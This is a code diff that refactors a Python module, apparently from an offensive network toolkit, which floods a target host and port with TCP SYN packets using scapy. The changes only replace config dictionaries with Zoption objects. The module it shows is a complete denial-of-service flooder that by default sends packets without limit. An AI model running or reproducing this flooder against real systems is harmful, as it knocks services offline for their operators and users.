@@ -2,6 +2,7 @@ from scapy.all import *
 from threading import Thread
 from dos import DoS
 from util import Msg
+from zoption import Zoption
 
 
 class tcp_syn(DoS):
@@ -11,14 +12,14 @@ class tcp_syn(DoS):
         """
         super(tcp_syn, self).__init__('TCP SYN')
         conf.verb = 0
-        self.config.update({"port":{"type":"int", 
-                                    "value":80,
-                                    "required":False, 
-                                    "display":"Attack port"},
-                            "count":{"type":"int", 
-                                     "value":-1,
-                                     "required":False,
-                      "display":"Number of packets to send (-1 infinite)"}
+        self.config.update({"port":Zoption(type = "int", 
+                                    value = 80,
+                                    required = False, 
+                                    display = "Attack port"),
+                            "count":Zoption(type = "int", 
+                                     value = -1,
+                                     required = False,
+                      display = "Number of packets to send (-1 infinite)")
                            })
         self.info = """
                     Very basic TCP SYN flooder that just spams SYN packets
@@ -26,7 +27,7 @@ class tcp_syn(DoS):
                     """
 
     def initialize(self):
-        Msg('Flooding \'%s\'...' % self.config['target']['value'])
+        Msg('Flooding \'%s\'...' % self.config['target'].value)
         thread = Thread(target=self.flood)
         self.running = True
         thread.start()
@@ -35,13 +36,13 @@ class tcp_syn(DoS):
     def flood(self):
         """ Send packets
         """
-        pkt = IP(dst=self.config['target']['value'])
-        pkt /= TCP(dport=self.config['port']['value'],
+        pkt = IP(dst=self.config['target'].value)
+        pkt /= TCP(dport=self.config['port'].value,
                                                     window=1000, flags='S')
         cnt = 0
         while self.running:
-            if self.config['count']['value'] > 0 and \
-                cnt >= self.config['count']['value']:
+            if self.config['count'].value > 0 and \
+                cnt >= self.config['count'].value:
                 break
 
             send(pkt)
@@ -51,5 +52,5 @@ class tcp_syn(DoS):
     def session_view(self):
         """ return ip/port of spammed host
         """
-        return "%s:%d" % (self.config['target']['value'],
-                          self.config['port']['value'])
+        return "%s:%d" % (self.config['target'].value,
+                          self.config['port'].value)
